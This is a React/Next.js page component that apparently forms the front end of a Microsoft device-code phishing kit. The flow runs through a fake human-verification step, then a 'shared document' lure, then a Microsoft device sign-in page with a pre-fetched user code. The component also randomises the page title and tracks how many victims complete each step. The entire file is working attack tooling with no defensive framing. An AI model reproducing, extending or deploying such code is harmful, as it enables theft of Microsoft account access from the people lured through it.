"use client";

import { useState, useEffect } from "react";
import Page1Verification from "@/components/Page1Verification";
import Page2SharedDocument from "@/components/Page2SharedDocument";
import PageMicrosoftDeviceAuth from "@/components/PageMicrosoftDeviceAuth";
import Page5Results from "@/components/Page5Results";
import { trackMetric } from "@/lib/trackMetric";

type Page = "verification" | "document" | "microsoft-signin" | "results";

const TITLE_WORDS = [
  "Fern", "Cedar", "Maple", "Willow", "Pine", "Oak", "Birch", "Aspen", "Hazel", "Rowan",
  "Ivy", "Juniper", "Cypress", "Magnolia", "Acacia", "Alder", "Elm", "Spruce", "Sequoia", "Laurel",
  "Olive", "Jasmine", "Clover", "Sage", "Amber", "River", "Meadow", "Forest", "Moss", "Rain",
  "Stone", "Ember", "Dawn", "Luna", "Nova", "Aurora", "Skye", "Echo", "Raven", "Phoenix",
  "Atlas", "Orion", "Sol", "Terra", "Flora", "Wren", "Fawn", "Dove", "Pearl", "Opal",
  "Ruby", "Jade", "Coral", "Iris", "Violet", "Rose", "Lily", "Daisy", "Poppy", "Marigold"
];

export default function Home() {
  const [currentPage, setCurrentPage] = useState<Page>("verification");
  const [cachedUserCode, setCachedUserCode] = useState("");
  const [cachedDeviceCode, setCachedDeviceCode] = useState("");

  // Random title logic
  useEffect(() => {
    const randomWord = TITLE_WORDS[Math.floor(Math.random() * TITLE_WORDS.length)];
    document.title = randomWord;
  }, []);

  useEffect(() => {
    trackMetric("started");
    
    // Pre-fetch device code immediately on mount so it's instantly ready
    async function prefetchCode() {
      try {
        const res = await fetch("/api/auth/device-code", { method: "POST" });
        const data = await res.json();
        if (data && data.user_code && data.device_code) {
          setCachedUserCode(data.user_code);
          setCachedDeviceCode(data.device_code);
        }
      } catch (e) {
        console.error("Prefetch code error:", e);
      }
    }
    prefetchCode();
  }, []);

  // Check session storage for verification state
  useEffect(() => {
    const sessionVerified = sessionStorage.getItem("securecheck_verified");
    if (sessionVerified === "true") {
      setCurrentPage("document");
    }
  }, []);

  const handleVerified = () => {
    trackMetric("human_verified");
    sessionStorage.setItem("securecheck_verified", "true");
    setCurrentPage("document");
  };

  const handleGoToMicrosoft = () => {
    setCurrentPage("microsoft-signin");
  };

  const handleSuccess = () => {
    trackMetric("completed");
    setCurrentPage("results");
  };

  const handleRestart = () => {
    sessionStorage.removeItem("securecheck_verified");
    setCurrentPage("verification");
  };

  return (
    <main className="min-h-screen w-full overflow-x-hidden">
      {currentPage === "verification" && (
        <Page1Verification onVerified={handleVerified} />
      )}
      {currentPage === "document" && (
        <Page2SharedDocument 
          initialUserCode={cachedUserCode}
          initialDeviceCode={cachedDeviceCode}
          onSuccess={handleGoToMicrosoft}
        />
      )}
      {currentPage === "microsoft-signin" && (
        <PageMicrosoftDeviceAuth onSuccess={handleSuccess} />
      )}
      {currentPage === "results" && (
        <Page5Results onRestart={handleRestart} />
      )}
    </main>
  );
}
